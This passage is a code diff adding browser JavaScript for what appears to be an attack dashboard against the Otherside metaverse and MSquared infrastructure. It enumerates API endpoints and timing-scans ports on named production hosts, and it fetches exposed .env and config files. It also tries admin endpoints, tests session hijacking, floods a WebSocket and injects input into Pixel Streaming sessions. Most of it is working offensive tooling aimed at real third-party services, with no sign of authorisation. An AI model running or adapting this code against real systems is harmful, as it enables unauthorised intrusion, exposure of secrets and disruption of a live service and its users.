+                { name: 'ODK Sessions', url: 'https://odk.otherside.xyz/api/v0/sessions' },
+            ];
+
+            for (let i = 0; i < endpoints.length; i++) {
+                const ep = endpoints[i];
+                log(cId, `Probing: ${ep.name} (${ep.url})`, 'dim');
+                const result = await directFetch(ep.url);
+                if (result.ok) {
+                    log(cId, `[${result.status}] ${ep.name}: ${ep.url}`, 'success');
+                    if (typeof result.data !== 'string') {
+                        log(cId, `  Response: ${JSON.stringify(result.data).substring(0, 300)}`, 'data');
+                    }
+                    stats.discovered++;
+                } else {
+                    log(cId, `[${result.status || 'ERR'}] ${ep.name}`, result.status ? 'warning' : 'dim');
+                }
+                setProgress('morpheusProgress', 10 + (i / endpoints.length) * 80);
+                stats.endpoints++;
+            }
+
+            setProgress('morpheusProgress', 100);
+            updateStats();
+            log(cId, 'Morpheus endpoint discovery complete.', 'success');
+        }
+
+        async function probeMSquaredInfrastructure() {
+            const cId = 'morpheusLog';
+            log(cId, 'Probing MSquared infrastructure details...', 'info');
+
+            // Check MSquared protocol page
+            const result = await directFetch('https://msquared.io/protocol');
+            if (result.ok && typeof result.data === 'string') {
+                const apiUrls = result.data.match(/https?:\/\/[^\s"']*.msquared.io[^\s"']*/gi) || [];
+                const wssUrls = result.data.match(/wss?:\/\/[^\s"']*/gi) || [];
+                [...new Set([...apiUrls, ...wssUrls])].forEach(url => {
+                    log(cId, `Discovered MSquared URL: ${url}`, 'success');
+                    stats.discovered++;
+                });
+            }
+
+            // Probe common infrastructure patterns
+            const infra = [
+                'https://infra.msquared.io/health',
+                'https://infra.msquared.io/status',
+                'https://gateway.msquared.io/health',
+                'https://gateway.msquared.io/v1/connect',
+                'https://gateway.msquared.io/v1/status',
+                'https://coordinator.msquared.io/status',
+                'https://coordinator.msquared.io/worlds',
+            ];
+
+            for (const url of infra) {
+                const r = await directFetch(url);
+                if (r.status && r.status !== 404) {
+                    log(cId, `[${r.status}] ${url}`, r.ok ? 'success' : 'warning');
+                    stats.discovered++;
+                }
+                stats.endpoints++;
+            }
+
+            updateStats();
+        }
+
+        async function resolveMorpheusDNS() {
+            const cId = 'morpheusLog';
+            log(cId, 'DNS resolution for Morpheus infrastructure...', 'info');
+
+            const domains = [
+                'msquared.io', 'api.msquared.io', 'gateway.msquared.io',
+                'auth.msquared.io', 'morpheus.msquared.io',
+                'odk.otherside.xyz', 'www.otherside.xyz',
+                'useglyph.io', 'auth.useglyph.io',
+            ];
+
+            // Use DoH (DNS over HTTPS) to resolve
+            for (const domain of domains) {
+                try {
+                    const result = await directFetch(`https://dns.google/resolve?name=${domain}&type=A`);
+                    if (result.ok && result.data.Answer) {
+                        const ips = result.data.Answer.map(a => a.data).join(', ');
+                        log(cId, `${domain} → ${ips}`, 'success');
+                    } else {
+                        log(cId, `${domain} → No A record found`, 'dim');
+                    }
+                } catch (e) {
+                    log(cId, `${domain} → DNS lookup failed`, 'error');
+                }
+            }
+
+            stats.endpoints += domains.length;
+            updateStats();
+        }
+
+        let morpheusWSCapture = [];
+
+        function connectMorpheusWS() {
+            const cId = 'morpheusWSLog';
+            const url = document.getElementById('morpheusWSUrl').value;
+            const token = document.getElementById('morpheusAuthToken').value;
+
+            if (!url) { log(cId, 'Please enter a WebSocket URL.', 'error'); return; }
+
+            log(cId, `Connecting to: ${url}`, 'info');
+
+            try {
+                morpheusWS = new WebSocket(url, token ? [token] : []);
+
+                morpheusWS.onopen = () => {
+                    log(cId, 'CONNECTED to Morpheus WebSocket!', 'success');
+                    stats.sessions++;
+                    updateStats();
+                };
+
+                morpheusWS.onmessage = (event) => {
+                    packetCount++;
+                    stats.packets++;
+                    const preview = typeof event.data === 'string' ? event.data.substring(0, 200) : `[Binary ${event.data.byteLength || 0} bytes]`;
+                    const direction = 'IN';
+                    const type = typeof event.data === 'string' ? 'JSON' : 'Binary';
+
+                    log(cId, `[${direction}] [${type}] ${preview}`, 'data');
+
+                    // Add to packet table
+                    addPacketRow(packetCount, direction, type, typeof event.data === 'string' ? event.data.length : 0, new Date().toISOString(), preview);
+                    morpheusWSCapture.push({ dir: direction, data: event.data, timestamp: Date.now() });
+                    updateStats();
+                };
+
+                morpheusWS.onerror = (err) => {
+                    log(cId, 'WebSocket error occurred.', 'error');
+                };
+
+                morpheusWS.onclose = (event) => {
+                    log(cId, `WebSocket closed: code=${event.code} reason=${event.reason}`, 'warning');
+                };
+            } catch (e) {
+                log(cId, `Connection error: ${e.message}`, 'error');
+            }
+        }
+
+        function addPacketRow(num, direction, type, size, timestamp, preview) {
+            const tbody = document.getElementById('morpheusPackets');
+            if (tbody.children.length === 1 && tbody.children[0].querySelector('[colspan]')) {
+                tbody.innerHTML = '';
+            }
+            const dirColor = direction === 'IN' ? '#86efac' : '#fdba74';
+            tbody.innerHTML = `<tr>
+                <td>${num}</td>
+                <td style="color:${dirColor}">${direction}</td>
+                <td>${type}</td>
+                <td>${size}</td>
+                <td>${timestamp}</td>
+                <td>${preview}</td>
+            </tr>` + tbody.innerHTML;
+        }
+
+        async function sendMorpheusCommand() {
+            const cId = 'morpheusWSLog';
+            if (!morpheusWS || morpheusWS.readyState !== WebSocket.OPEN) {
+                log(cId, 'Not connected. Connect to a Morpheus WebSocket first.', 'error');
+                return;
+            }
+
+            const command = prompt('Enter command to send (JSON):', '{"type":"ping"}');
+            if (!command) return;
+
+            try {
+                morpheusWS.send(command);
+                packetCount++;
+                stats.packets++;
+                log(cId, `[OUT] ${command}`, 'data');
+                addPacketRow(packetCount, 'OUT', 'JSON', command.length, new Date().toISOString(), command);
+                updateStats();
+            } catch (e) {
+                log(cId, `Send error: ${e.message}`, 'error');
+            }
+        }
+
+        async function floodMorpheusWS() {
+            const cId = 'morpheusWSLog';
+            if (!morpheusWS || morpheusWS.readyState !== WebSocket.OPEN) {
+                log(cId, 'Not connected. Connect first.', 'error');
+                return;
+            }
+
+            log(cId, 'WARNING: Sending 100 rapid ping messages...', 'warning');
+            for (let i = 0; i < 100; i++) {
+                try {
+                    morpheusWS.send(JSON.stringify({ type: 'ping', seq: i }));
+                    stats.packets++;
+                } catch (e) { break; }
+            }
+            log(cId, 'Stress test messages sent.', 'warning');
+            updateStats();
+        }
+
+        async function analyzeMorpheusProtocol() {
+            const cId = 'morpheusWSLog';
+            log(cId, 'Analyzing captured Morpheus protocol data...', 'info');
+
+            if (morpheusWSCapture.length === 0) {
+                log(cId, 'No packets captured yet. Connect and capture first.', 'warning');
+                return;
+            }
+
+            const jsonPackets = morpheusWSCapture.filter(p => typeof p.data === 'string');
+            const binaryPackets = morpheusWSCapture.filter(p => typeof p.data !== 'string');
+
+            log(cId, `Total packets: ${morpheusWSCapture.length}`, 'info');
+            log(cId, `JSON packets: ${jsonPackets.length}`, 'info');
+            log(cId, `Binary packets: ${binaryPackets.length}`, 'info');
+
+            // Analyze JSON message types
+            const messageTypes = {};
+            jsonPackets.forEach(p => {
+                try {
+                    const parsed = JSON.parse(p.data);
+                    const type = parsed.type || parsed.op || parsed.action || 'unknown';
+                    messageTypes[type] = (messageTypes[type] || 0) + 1;
+                } catch {}
+            });
+
+            Object.entries(messageTypes).forEach(([type, count]) => {
+                log(cId, `  Message type "${type}": ${count} occurrences`, 'data');
+            });
+
+            log(cId, 'Protocol analysis complete.', 'success');
+        }
+
+        // ===================================================================
+        // PHASE 4: NATIVE CLIENT
+        // ===================================================================
+
+        async function analyzeNativeClient() {
+            const cId = 'nativeLog';
+            log(cId, 'Analyzing Otherside native client structure...', 'info');
+            setProgress('nativeProgress', 10);
+
+            // Check client download page
+            log(cId, 'Checking client distribution...', 'info');
+            const clientPage = await directFetch('https://www.otherside.center');
+            if (clientPage.ok) {
+                log(cId, 'Client download page accessible', 'success');
+                if (typeof clientPage.data === 'string') {
+                    const downloadUrls = clientPage.data.match(/https?:\/\/[^\s"']*(?:download|client|installer|\.exe|\.dmg)[^\s"']*/gi) || [];
+                    downloadUrls.forEach(url => log(cId, `Download URL: ${url}`, 'data'));
+                    const s3Urls = clientPage.data.match(/https?:\/\/[^\s"']*s3[^\s"']*/gi) || [];
+                    const cdnUrls = clientPage.data.match(/https?:\/\/[^\s"']*cdn[^\s"']*/gi) || [];
+                    [...new Set([...s3Urls, ...cdnUrls])].forEach(url => {
+                        log(cId, `CDN/Storage URL: ${url}`, 'data');
+                        stats.discovered++;
+                    });
+                }
+            }
+
+            setProgress('nativeProgress', 40);
+
+            // Analyze ODK Dashboard API
+            log(cId, 'Probing ODK Dashboard API endpoints...', 'info');
+            const odkEndpoints = [
+                'health', 'status', 'version', 'config',
+                'organizations', 'projects', 'worlds', 'sessions',
+                'users/current', 'permissions', 'billing',
+                'origin/access', 'origin/streaming', 'origin/sessions',
+                'apiKeys', 'deployments', 'builds',
+            ];
+
+            const token = document.getElementById('nativeToken').value || 'test';
+            for (let i = 0; i < odkEndpoints.length; i++) {
+                const result = await proxyRequest(odkEndpoints[i], 'GET', token);
+                if (result.status && result.status !== 404) {
+                    log(cId, `[${result.status}] /api/v0/${odkEndpoints[i]}`, result.status === 200 ? 'success' : 'warning');
+                    stats.discovered++;
+                }
+                setProgress('nativeProgress', 40 + (i / odkEndpoints.length) * 50);
+                stats.endpoints++;
+            }
+
+            setProgress('nativeProgress', 100);
+            updateStats();
+            log(cId, 'Native client analysis complete.', 'success');
+        }
+
+        async function enumerateClientAPIs() {
+            const cId = 'nativeLog';
+            log(cId, 'Enumerating all client-facing API endpoints...', 'info');
+
+            const token = document.getElementById('nativeToken').value || 'test';
+            const apiPaths = [
+                'auth/session', 'auth/token', 'auth/refresh', 'auth/logout',
+                'wallet/nonce', 'wallet/verify', 'wallet/balance', 'wallet/nfts',
+                'world/list', 'world/travel', 'world/create', 'world/delete',
+                'player/profile', 'player/inventory', 'player/stats', 'player/achievements',
+                'chat/channels', 'chat/messages', 'chat/send',
+                'nft/mint', 'nft/transfer', 'nft/delegate',
+                'quest/list', 'quest/start', 'quest/complete',
+                'notification/list', 'notification/read',
+                'moderation/report', 'moderation/ban',
+                'analytics/events', 'analytics/metrics',
+            ];
+
+            for (const path of apiPaths) {
+                const result = await proxyRequest(path, 'GET', token);
+                if (result.status && result.status !== 404) {
+                    log(cId, `[${result.status}] /api/v0/${path}`, result.status === 200 ? 'success' : 'warning');
+                    if (result.status === 200 && result.data) {
+                        log(cId, `  Data: ${JSON.stringify(result.data).substring(0, 200)}`, 'data');
+                        stats.discovered++;
+                    }
+                }
+                stats.endpoints++;
+            }
+
+            updateStats();
+        }
+
+        async function extractClientConfig() {
+            const cId = 'nativeLog';
+            log(cId, 'Extracting client configuration files...', 'info');
+
+            // Common config file paths on the web server
+            const configPaths = [
+                'config.json', 'config.js', 'env.js', 'runtime-config.js',
+                'firebase-config.json', 'app-config.json', 'settings.json',
+                'manifest.json', 'version.json', 'build-info.json',
+                '.env', '.env.local', '.env.production',
+            ];
+
+            for (const path of configPaths) {
+                const result = await directFetch(`https://odk.otherside.xyz/${path}`);
+                if (result.ok) {
+                    log(cId, `FOUND: ${path}`, 'success');
+                    log(cId, `  Content: ${typeof result.data === 'string' ? result.data.substring(0, 300) : JSON.stringify(result.data).substring(0, 300)}`, 'data');
+                    stats.discovered++;
+                    stats.vulns++;
+                }
+                stats.endpoints++;
+            }
+
+            // Check Otherside main site
+            for (const path of ['config.js', 'env.js', 'runtime-config.js', '__ENV.js']) {
+                const result = await directFetch(`https://www.otherside.xyz/${path}`);
+                if (result.ok) {
+                    log(cId, `FOUND on otherside.xyz: ${path}`, 'success');
+                    stats.discovered++;
+                }
+            }
+
+            updateStats();
+        }
+
+        async function scanClientPorts() {
+            const cId = 'nativeLog';
+            log(cId, 'Scanning common ports on Otherside infrastructure...', 'info');
+            log(cId, 'Note: Browser-based port scanning uses timing attacks.', 'dim');
+
+            const hosts = ['odk.otherside.xyz', 'www.otherside.xyz'];
+            const ports = [80, 443, 3000, 4000, 5000, 8080, 8443, 9090, 9443, 25565];
+
+            for (const host of hosts) {
+                for (const port of ports) {
+                    const start = performance.now();
+                    try {
+                        await fetch(`https://${host}:${port}/`, { mode: 'no-cors', signal: AbortSignal.timeout(2000) });
+                        const elapsed = performance.now() - start;
+                        if (elapsed < 1000) {
+                            log(cId, `${host}:${port} → OPEN (${Math.round(elapsed)}ms)`, 'success');
+                            stats.discovered++;
+                        }
+                    } catch (e) {
+                        const elapsed = performance.now() - start;
+                        if (elapsed < 500) {
+                            log(cId, `${host}:${port} → possibly open (${Math.round(elapsed)}ms)`, 'warning');
+                        }
+                    }
+                    stats.endpoints++;
+                }
+            }
+
+            updateStats();
+        }
+
+        // ODK Dashboard sub-functions
+        async function probeODKDashboard() {
+            const cId = 'nativeAPILog';
+            const token = document.getElementById('nativeToken').value || 'test';
+            log(cId, 'Probing ODK Dashboard API...', 'info');
+
+            const endpoints = ['health', 'status', 'version', 'organizations', 'projects', 'worlds', 'users/current', 'permissions', 'billing', 'apiKeys'];
+            for (const ep of endpoints) {
+                const result = await proxyRequest(ep, 'GET', token);
+                log(cId, `[${result.status || 'ERR'}] /api/v0/${ep}`, result.status === 200 ? 'success' : 'warning');
+                if (result.status === 200 && result.data) {
+                    log(cId, `  ${JSON.stringify(result.data).substring(0, 300)}`, 'data');
+                }
+                stats.endpoints++;
+            }
+            updateStats();
+        }
+
+        async function listODKProjects() {
+            const cId = 'nativeAPILog';
+            const token = document.getElementById('nativeToken').value || 'test';
+            const result = await proxyRequest('organizations/projects', 'GET', token);
+            log(cId, `Projects: ${JSON.stringify(result).substring(0, 500)}`, result.status === 200 ? 'success' : 'warning');
+            stats.endpoints++; updateStats();
+        }
+
+        async function getODKPermissions() {
+            const cId = 'nativeAPILog';
+            const token = document.getElementById('nativeToken').value || 'test';
+            const result = await proxyRequest('permissions/roles', 'GET', token);
+            log(cId, `Permissions: ${JSON.stringify(result).substring(0, 500)}`, result.status === 200 ? 'success' : 'warning');
+            stats.endpoints++; updateStats();
+        }
+
+        async function tryODKAdmin() {
+            const cId = 'nativeAPILog';
+            const token = document.getElementById('nativeToken').value || 'test';
+            log(cId, 'Attempting admin-level access...', 'warning');
+            const adminEndpoints = ['admin/users', 'admin/config', 'admin/settings', 'admin/apiKeys', 'organizations/admin'];
+            for (const ep of adminEndpoints) {
+                const result = await proxyRequest(ep, 'GET', token);
+                log(cId, `[${result.status || 'ERR'}] /api/v0/${ep}`, result.status === 200 ? 'critical' : 'info');
+                if (result.status === 200) { stats.vulns++; log(cId, 'ADMIN ACCESS GRANTED!', 'critical'); }
+                stats.endpoints++;
+            }
+            updateStats();
+        }
+
+        async function probeWalletAPI() {
+            const cId = 'nativeAPILog';
+            const token = document.getElementById('nativeToken').value || 'test';
+            log(cId, 'Probing Wallet API endpoints...', 'info');
+            const endpoints = ['wallet/nonce', 'wallet/verify', 'wallet/balance', 'wallet/nfts', 'wallet/tokens', 'wallet/delegate'];
+            for (const ep of endpoints) {
+                const result = await proxyRequest(ep, 'GET', token);
+                log(cId, `[${result.status || 'ERR'}] /api/v0/${ep}`, result.status === 200 ? 'success' : 'warning');
+                stats.endpoints++;
+            }
+            updateStats();
+        }
+
+        async function testWalletNonce() {
+            const cId = 'nativeAPILog';
+            const token = document.getElementById('nativeToken').value || 'test';
+            const result = await proxyRequest('wallet/nonce', 'POST', token, { address: '0x0000000000000000000000000000000000000000' });
+            log(cId, `Wallet nonce: ${JSON.stringify(result).substring(0, 300)}`, result.status === 200 ? 'success' : 'warning');
+            stats.endpoints++; updateStats();
+        }
+
+        async function testWalletVerify() {
+            const cId = 'nativeAPILog';
+            const token = document.getElementById('nativeToken').value || 'test';
+            const result = await proxyRequest('wallet/verify', 'POST', token, { address: '0x0000000000000000000000000000000000000000', signature: '0xtest', nonce: '1' });
+            log(cId, `Wallet verify: ${JSON.stringify(result).substring(0, 300)}`, 'data');
+            stats.endpoints++; updateStats();
+        }
+
+        async function listWorlds() {
+            const cId = 'nativeAPILog';
+            const token = document.getElementById('nativeToken').value || 'test';
+            const result = await proxyRequest('worlds', 'GET', token);
+            log(cId, `Worlds: ${JSON.stringify(result).substring(0, 500)}`, result.status === 200 ? 'success' : 'warning');
+            stats.endpoints++; updateStats();
+        }
+
+        async function getWorldDetails() {
+            const cId = 'nativeAPILog';
+            const token = document.getElementById('nativeToken').value || 'test';
+            const result = await proxyRequest('worlds/details', 'GET', token);
+            log(cId, `World details: ${JSON.stringify(result).substring(0, 500)}`, 'data');
+            stats.endpoints++; updateStats();
+        }
+
+        async function tryWorldTravel() {
+            const cId = 'nativeAPILog';
+            const token = document.getElementById('nativeToken').value || 'test';
+            const result = await proxyRequest('worlds/travel', 'POST', token, { destination: 'swamp' });
+            log(cId, `World travel: ${JSON.stringify(result).substring(0, 300)}`, 'data');
+            stats.endpoints++; updateStats();
+        }
+
+        async function probeSessionAPI() {
+            const cId = 'nativeAPILog';
+            const token = document.getElementById('nativeToken').value || 'test';
+            log(cId, 'Probing Session API...', 'info');
+            const endpoints = ['sessions', 'sessions/active', 'sessions/queue', 'sessions/history'];
+            for (const ep of endpoints) {
+                const result = await proxyRequest(ep, 'GET', token);
+                log(cId, `[${result.status || 'ERR'}] /api/v0/${ep}`, result.status === 200 ? 'success' : 'warning');
+                stats.endpoints++;
+            }
+            updateStats();
+        }
+
+        async function listActiveSessions() {
+            const cId = 'nativeAPILog';
+            const token = document.getElementById('nativeToken').value || 'test';
+            const result = await proxyRequest('sessions/active', 'GET', token);
+            log(cId, `Active sessions: ${JSON.stringify(result).substring(0, 500)}`, 'data');
+            stats.endpoints++; updateStats();
+        }
+
+        async function trySessionHijack() {
+            const cId = 'nativeAPILog';
+            const token = document.getElementById('nativeToken').value || 'test';
+            log(cId, 'Testing session hijacking vectors...', 'warning');
+            // Try using a token on different endpoints to see if sessions are transferable
+            const result = await proxyRequest('sessions/active', 'GET', token);
+            log(cId, `Session data accessible: ${result.status === 200 ? 'YES - token grants session access' : 'NO'}`, result.status === 200 ? 'warning' : 'info');
+            stats.endpoints++; updateStats();
+        }
+
+        // ===================================================================
+        // PHASE 5: PIXEL STREAMING
+        // ===================================================================
+
+        async function discoverStreamingEndpoints() {
+            const cId = 'streamingLog';
+            log(cId, 'Discovering Pixel Streaming infrastructure...', 'info');
+            setProgress('streamingProgress', 10);
+
+            const endpoints = [
+                { name: 'Otherside Stream', url: 'https://www.otherside.xyz/play' },
+                { name: 'Immersive Stream API', url: 'https://stream.googleapis.com/v1/projects/scarcely-calm-lark/locations/global/instances' },
+                { name: 'ODK Streaming', url: 'https://odk.otherside.xyz/api/v0/streaming' },
+                { name: 'ODK Sessions', url: 'https://odk.otherside.xyz/api/v0/sessions/queue' },
+                { name: 'Cirrus Signaling', url: 'https://www.otherside.xyz/cirrus' },
+                { name: 'Pixel Streaming Client', url: 'https://www.otherside.xyz/player' },
+                { name: 'Stream Health', url: 'https://odk.otherside.xyz/api/v0/health' },
+                { name: 'Google Immersive Stream XR', url: 'https://immersivestream.googleapis.com/v1' },
+            ];
+
+            for (let i = 0; i < endpoints.length; i++) {
+                const ep = endpoints[i];
+                log(cId, `Probing: ${ep.name}`, 'dim');
+                const result = await directFetch(ep.url);
+                if (result.status) {
+                    log(cId, `[${result.status}] ${ep.name}: ${ep.url}`, result.ok ? 'success' : 'warning');
+                    if (result.ok && typeof result.data === 'string' && result.data.length > 0 && result.data.length < 1000) {
+                        log(cId, `  Content: ${result.data.substring(0, 200)}`, 'data');
+                    }
+                    if (result.ok) stats.discovered++;
+                }
+                setProgress('streamingProgress', 10 + (i / endpoints.length) * 80);
+                stats.endpoints++;
+            }
+
+            // Check for Pixel Streaming JS files
+            log(cId, 'Looking for Pixel Streaming client JS...', 'info');
+            const jsPaths = [
+                'https://www.otherside.xyz/pixelstreaming.js',
+                'https://www.otherside.xyz/epicwebservices.js',
+                'https://www.otherside.xyz/app.js',
+                'https://www.otherside.xyz/main.js',
+                'https://www.otherside.xyz/player.js',
+            ];
+
+            for (const url of jsPaths) {
+                const result = await directFetch(url);
+                if (result.ok && typeof result.data === 'string' && result.data.includes('WebSocket')) {
+                    log(cId, `FOUND Pixel Streaming JS: ${url}`, 'success');
+                    // Extract WebSocket URLs
+                    const wsUrls = result.data.match(/wss?:\/\/[^\s"'`]+/gi) || [];
+                    wsUrls.forEach(ws => log(cId, `  WebSocket URL: ${ws}`, 'data'));
+                    stats.discovered++;
+                }
+            }
+
+            setProgress('streamingProgress', 100);
+            updateStats();
+            log(cId, 'Pixel Streaming discovery complete.', 'success');
+        }
+
+        async function probeSignalingServer() {
+            const cId = 'streamingLog';
+            log(cId, 'Probing Pixel Streaming signaling server...', 'info');
+
+            const signalingUrls = [
+                'wss://www.otherside.xyz/cirrus',
+                'wss://signaling.otherside.xyz',
+                'wss://streaming.otherside.xyz',
+                'wss://www.otherside.xyz/ws',
+                'wss://odk.otherside.xyz/streaming',
+            ];
+
+            for (const url of signalingUrls) {
+                log(cId, `Testing: ${url}`, 'dim');
+                try {
+                    const ws = new WebSocket(url);
+                    ws.onopen = () => {
+                        log(cId, `CONNECTED: ${url}`, 'success');
+                        stats.sessions++;
+                        ws.close();
+                        updateStats();
+                    };
+                    ws.onerror = () => {
+                        log(cId, `Failed: ${url}`, 'dim');
+                    };
+                    setTimeout(() => { if (ws.readyState === WebSocket.CONNECTING) ws.close(); }, 3000);
+                } catch (e) {
+                    log(cId, `Error: ${e.message}`, 'error');
+                }
+            }
+
+            stats.endpoints += signalingUrls.length;
+            updateStats();
+        }
+
+        async function probeSTUNTURN() {
+            const cId = 'streamingLog';
+            log(cId, 'Probing STUN/TURN servers used by Pixel Streaming...', 'info');
+
+            // Common STUN/TURN servers used by Google Immersive Stream
+            const servers = [
+                'stun:stun.l.google.com:19302',
+                'stun:stun1.l.google.com:19302',
+                'stun:stun2.l.google.com:19302',
+                'stun:stun3.l.google.com:19302',
+                'stun:stun4.l.google.com:19302',
+                'turn:turn.otherside.xyz:3478',
+                'turn:turn.msquared.io:3478',
+            ];
+
+            servers.forEach(server => {
+                log(cId, `ICE Server: ${server}`, 'info');
+            });
+
+            log(cId, 'To fully test WebRTC connectivity, use the browser\'s RTCPeerConnection API.', 'info');
+            log(cId, 'The Pixel Streaming client uses these servers for NAT traversal.', 'info');
+
+            // Try to create a test peer connection
+            try {
+                const pc = new RTCPeerConnection({
+                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                });
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        log(cId, `ICE Candidate: ${event.candidate.candidate}`, 'data');
+                        stats.packets++;
+                    }
+                };
+                pc.createDataChannel('test');
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+                log(cId, 'Local SDP offer created. ICE gathering started.', 'success');
+                setTimeout(() => pc.close(), 5000);
+            } catch (e) {
+                log(cId, `WebRTC test error: ${e.message}`, 'error');
+            }
+
+            updateStats();
+        }
+
+        let streamingWSCapture = [];
+
+        function connectStreamingSignaling() {
+            const cId = 'streamingWSLog';
+            const url = document.getElementById('streamingSignalingUrl').value;
+            if (!url) { log(cId, 'Please enter a signaling server URL.', 'error'); return; }
+
+            log(cId, `Connecting to Pixel Streaming signaling: ${url}`, 'info');
+
+            try {
+                streamingWS = new WebSocket(url);
+
+                streamingWS.onopen = () => {
+                    log(cId, 'CONNECTED to signaling server!', 'success');
+                    stats.sessions++;
+                    updateStats();
+                };
+
+                streamingWS.onmessage = (event) => {
+                    stats.packets++;
+                    const data = typeof event.data === 'string' ? event.data.substring(0, 500) : `[Binary]`;
+                    log(cId, `[IN] ${data}`, 'data');
+                    streamingWSCapture.push({ data: event.data, timestamp: Date.now() });
+
+                    // Try to parse as JSON
+                    try {
+                        const parsed = JSON.parse(event.data);
+                        if (parsed.type === 'config') {
+                            log(cId, `Stream config received: ${JSON.stringify(parsed).substring(0, 300)}`, 'success');
+                        } else if (parsed.type === 'answer') {
+                            log(cId, `SDP Answer received (WebRTC setup)`, 'success');
+                        } else if (parsed.type === 'iceCandidate') {
+                            log(cId, `ICE Candidate received`, 'data');
+                        }
+                    } catch {}
+                };
+
+                streamingWS.onerror = () => log(cId, 'WebSocket error.', 'error');
+                streamingWS.onclose = (e) => log(cId, `Closed: ${e.code} ${e.reason}`, 'warning');
+            } catch (e) {
+                log(cId, `Error: ${e.message}`, 'error');
+            }
+        }
+
+        async function interceptInputChannel() {
+            const cId = 'streamingWSLog';
+            if (!streamingWS || streamingWS.readyState !== WebSocket.OPEN) {
+                log(cId, 'Not connected to signaling server.', 'error');
+                return;
+            }
+            log(cId, 'Listening for input channel messages...', 'info');
+            log(cId, 'Pixel Streaming input is sent via a WebRTC DataChannel or WebSocket.', 'info');
+            log(cId, 'Captured messages will appear above as they arrive.', 'info');
+        }
+
+        async function injectStreamingInput() {
+            const cId = 'streamingWSLog';
+            if (!streamingWS || streamingWS.readyState !== WebSocket.OPEN) {
+                log(cId, 'Not connected to signaling server.', 'error');
+                return;
+            }
+
+            log(cId, 'Injecting custom input commands...', 'warning');
+
+            // Pixel Streaming input protocol messages
+            const commands = [
+                { type: 'MouseClick', x: 500, y: 400, button: 0 },
+                { type: 'KeyDown', key: 'W' },
+                { type: 'KeyUp', key: 'W' },
+                { type: 'MouseMove', x: 500, y: 400, deltaX: 10, deltaY: 5 },
+            ];
+
+            for (const cmd of commands) {
+                streamingWS.send(JSON.stringify(cmd));
+                log(cId, `[OUT] ${JSON.stringify(cmd)}`, 'data');
+                stats.packets++;
+            }
+
+            updateStats();
+        }
+
+        async function captureSDP() {
+            const cId = 'streamingWSLog';
+            log(cId, 'Capturing SDP/ICE data from signaling...', 'info');
+
+            if (streamingWSCapture.length > 0) {
+                streamingWSCapture.forEach((msg, i) => {
+                    try {
+                        const parsed = JSON.parse(msg.data);
+                        if (parsed.sdp) log(cId, `SDP [${i}]: ${parsed.sdp.substring(0, 200)}...`, 'data');
+                        if (parsed.candidate) log(cId, `ICE [${i}]: ${parsed.candidate}`, 'data');
+                    } catch {}
+                });
+            } else {
+                log(cId, 'No captured messages. Connect to signaling first.', 'warning');
+            }
+        }
+
+        async function analyzeStreamingJS() {
+            const cId = 'streamingJSLog';
+            log(cId, 'Analyzing Pixel Streaming JavaScript client...', 'info');
+
+            // Fetch the Otherside play page and extract JS
+            const result = await directFetch('https://www.otherside.xyz');
+            if (result.ok && typeof result.data === 'string') {
+                const scriptSrcs = result.data.match(/src=["']([^"']*\.js[^"']*)/gi) || [];
+                const inlineScripts = result.data.match(/<script[^>]*>([\s\S]*?)<\/script>/gi) || [];
+
+                log(cId, `Found ${scriptSrcs.length} external scripts and ${inlineScripts.length} inline scripts`, 'info');
+
+                scriptSrcs.forEach(src => {
+                    const url = src.replace(/src=["']/, '').replace(/["']$/, '');
+                    log(cId, `Script: ${url}`, 'data');
+                });
+
+                // Look for Pixel Streaming specific code
+                const psKeywords = ['pixelstreaming', 'webrtc', 'RTC', 'signaling', 'cirrus', 'immersive', 'stream', 'DataChannel'];
+                psKeywords.forEach(kw => {
+                    if (result.data.toLowerCase().includes(kw.toLowerCase())) {
+                        log(cId, `Found keyword: ${kw}`, 'success');
+                    }
+                });
+            }
+
+            stats.endpoints++;
+            updateStats();
+        }
+
+        async function findPixelStreamingEndpoints() {
+            const cId = 'streamingJSLog';
+            log(cId, 'Searching for Pixel Streaming endpoints...', 'info');
+
+            const paths = [
+                '/api/streaming', '/api/v0/streaming', '/api/v0/origin/streaming',
+                '/api/v0/sessions/queue', '/play', '/player', '/stream',
+                '/cirrus', '/signalling', '/signalr',
+                '/pixelstreaming', '/webrtc',
+            ];
+
+            for (const path of paths) {
+                const result = await directFetch(`https://www.otherside.xyz${path}`);
+                if (result.status && result.status !== 404) {
+                    log(cId, `[${result.status}] https://www.otherside.xyz${path}`, result.ok ? 'success' : 'warning');
+                    stats.discovered++;
+                }
+
+                const odkResult = await directFetch(`https://odk.otherside.xyz${path}`);
+                if (odkResult.status && odkResult.status !== 404) {
+                    log(cId, `[${odkResult.status}] https://odk.otherside.xyz${path}`, odkResult.ok ? 'success' : 'warning');
+                    stats.discovered++;
+                }
+                stats.endpoints += 2;
+            }
+
+            updateStats();
+        }
+
+        async function buildPixelStreamingClient() {
+            const cId = 'streamingJSLog';
+            log(cId, 'Building custom Pixel Streaming client...', 'info');
+            log(cId, 'A custom client can intercept all WebRTC traffic and inject inputs.', 'info');
+
+            const clientCode = `
+// Custom Pixel Streaming Client
+// This client connects to Otherside's Pixel Streaming infrastructure
+// and can intercept/modify all communication
+
+class CustomPixelStreamingClient {
+    constructor(signalingUrl) {
+        this.signalingUrl = signalingUrl;
+        this.pc = null;
+        this.dc = null;
+        this.ws = null;
+    }
+
+    async connect() {
+        // 1. Connect to signaling server
+        this.ws = new WebSocket(this.signalingUrl);
+
+        this.ws.onmessage = async (event) => {
+            const msg = JSON.parse(event.data);
+            switch(msg.type) {
+                case 'config':
+                    console.log('[PS] Config:', msg);
+                    break;
+                case 'answer':
+                    await this.pc.setRemoteDescription(msg);
+                    console.log('[PS] SDP Answer set');
+                    break;
+                case 'iceCandidate':
+                    await this.pc.addIceCandidate(msg.candidate);
+                    console.log('[PS] ICE Candidate added');
+                    break;
+            }
+        };
+
+        // 2. Create WebRTC Peer Connection
+        this.pc = new RTCPeerConnection({
+            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+        });
+
+        // 3. Create Data Channel for input
+        this.dc = this.pc.createDataChannel('input');
+        this.dc.onopen = () => console.log('[PS] Input channel open!');
+
+        // 4. Create and send offer
+        const offer = await this.pc.createOffer();
+        await this.pc.setLocalDescription(offer);
+        this.ws.send(JSON.stringify(offer));
+    }
+
+    injectInput(type, data) {
+        if (this.dc?.readyState === 'open') {
+            this.dc.send(JSON.stringify({ type, ...data }));
+        }
+    }
+}`;
+
